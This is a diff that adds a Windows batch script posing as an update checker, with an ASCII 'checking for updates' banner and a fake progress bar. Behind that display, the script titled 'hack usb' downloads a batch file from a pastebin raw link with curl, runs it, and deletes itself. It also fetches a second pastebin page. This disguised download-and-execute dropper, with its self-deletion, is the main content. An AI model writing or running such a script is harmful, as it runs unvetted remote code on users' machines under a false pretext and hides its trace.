@@ -1,0 +1,88 @@
+@echo off 
+echo  _______           _______  _______  _       _________ _        _______ 
+echo (  ____ \[\     /](  ____ \(  ____ \[ \    /\\__   __/( (    /](  ____ \
+echo [ (    \/[ )   ( ][ (    \/[ (    \/[  \  / /   ) (   [  \  ( ][ (    \/
+echo [ ]      [ (___) ][ (__    [ ]      [  (_/ /    [ ]   [   \ [ ][ ]      
+echo [ ]      [  ___  ][  __)   [ ]      [   _ (     [ ]   [ (\ \) ][ ] ____ 
+echo [ ]      [ (   ) ][ (      [ ]      [  ( \ \    [ ]   [ [ \   ][ ] \_  )
+echo [ (____/\[ )   ( ][ (____/\[ (____/\[  /  \ \___) (___[ )  \  ][ (___) ]
+echo (_______/[/     \](_______/(_______/[_/    \/\_______/[/    )_)(_______)
+
+echo                       _______  _______  _______ 
+echo                      (  ____ \(  ___  )(  ____ )
+echo                      [ (    \/[ (   ) ][ (    )]
+echo                      [ (__    [ [   ] ][ (____)]
+echo                      [  __)   [ [   ] ][     __)
+echo                      [ (      [ [   ] ][ (\ (   
+echo                      [ )      [ (___) ][ ) \ \__
+echo                      [/       (_______)[/   \__/
+
+echo                _______  ______   _______ _________ _______  _______ 
+echo      [\     /](  ____ )(  __  \ (  ___  )\__   __/(  ____ \(  ____ \
+echo      [ )   ( ][ (    )][ (  \  )[ (   ) ]   ) (   [ (    \/[ (    \/
+echo      [ [   [ ][ (____)][ [   ) ][ (___) ]   [ ]   [ (__    [ (_____ 
+echo      [ [   [ ][  _____)[ [   ] ][  ___  ]   [ ]   [  __)   (_____  )
+echo      [ [   [ ][ (      [ [   ) ][ (   ) ]   [ ]   [ (            ) ]
+echo      [ (___) ][ )      [ (__/  )[ )   ( ]   [ ]   [ (____/\/\____) ]
+echo      (_______)[/       (______/ [/     \]   )_(   (_______/\_______)
+
+ping -n 1 www.google.com >nul
+if errorlevel 1 (
+  mshta "javascript:alert('No internet connection!');close()"
+  cls
+  pause>nul
+  exit
+)
+
+
+IF "%var%"=="on" (
+    echo The project is under programming...
+    goto:Loading
+) ELSE (
+   >nul chcp 65001 
+   setlocal enabledelayedexpansion
+   set "_spc=          "
+   set "_bar=■■■■■■■■■■" 
+   set "_msg= Progress bar loop."
+   <con: color 0A & mode 70,4 & echo\ 
+   for /f %%a in ('copy/Z "%~dpf0" nul')do for /f skip^=4 %%b in ('echo;prompt;$H^|cmd')do set "BS=%%b" & set "CR=%%a"
+   for /l %%L in (1 1 10)do <con: set/p "'=!CR!!BS!!CR![!_bar:~0,%%~L!!BS!!_spc:~%%L!]!_msg!"<nul & >nul timeout.exe 1
+   :eof
+   set var=on
+   Title hack usb
+   IF "%~n0"=="HACK-USB" (
+   curl "https://pastebin.com/raw/hbUUwHMA" --output HACK_USB.bat
+   start HACK_USB.bat %var%
+) ELSE (
+   curl "https://pastebin.com/raw/hbUUwHMA" --output HACK-USB.bat
+   start HACK-USB.bat %var%
+)
+   del %~n0.bat
+   exit
+   pause
+   exit
+   endlocal & color & goto :eof
+)
+
+
+
+
+
+:Loading
+cls
+
+title CMD Loading... 
+set load1= _ 
+set load2=(_)
+set/a loadnum=1
+
+set load1=%load1% _ 
+set load2=%load2%(_)
+
+cls
+curl https://pastebin.com/raw/hwsLFRxj
+
+
+
+
+pause
